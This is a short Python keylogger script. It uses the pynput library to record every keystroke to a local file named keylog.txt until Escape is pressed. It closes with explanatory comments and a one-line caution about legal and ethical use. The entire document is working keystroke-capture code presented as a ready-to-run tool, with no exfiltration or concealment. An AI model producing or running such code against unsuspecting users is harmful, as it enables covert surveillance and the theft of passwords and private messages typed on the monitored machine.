#!/bin/python3

"""Keylogger script to capture keystrokes and save them to a file. Advanced usage may require additional permissions or libraries."""

import pynput
from pynput.keyboard import Key, Listener   

def on_press(key):      

    """Callback function to handle key press events."""
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like Shift, Ctrl, etc.)
        with open("keylog.txt", "a") as f:
            f.write(f" {key} ")

def on_release(key):    
    
    """Callback function to handle key release events."""
    if key == Key.esc:
        # Stop listener
        return False
    
# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
# This code uses the pynput library to create a keylogger that captures keystrokes and saves them to a file named "keylog.txt".

# The on_press function writes the pressed key to the file, while the on_release function stops the listener when the Escape key is pressed.

# Note: Running a keylogger may require administrative privileges and should be done in compliance with legal and ethical guidelines.